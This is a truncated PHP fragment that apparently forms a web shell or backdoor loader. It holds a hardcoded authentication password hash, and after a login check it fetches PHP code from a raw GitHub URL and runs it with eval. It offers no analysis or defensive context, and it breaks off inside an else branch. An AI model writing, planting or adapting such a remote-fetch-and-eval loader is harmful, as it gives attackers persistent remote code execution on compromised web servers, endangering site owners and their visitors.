<?php
$auth_pass = "aa2d7adfd6e54a28ad41320e4b5ef0bca6f8a544b25faedac7a8a74d51116891";
...
if (is_logged_in()) {
    ...
    $a = fetchRemoteContent('https://raw.githubusercontent.com/hokigacor219/atg/refs/heads/main/XJ399/bye2.php');
    if ($a !== false) {
        eval('?>' . $a);
    } else {
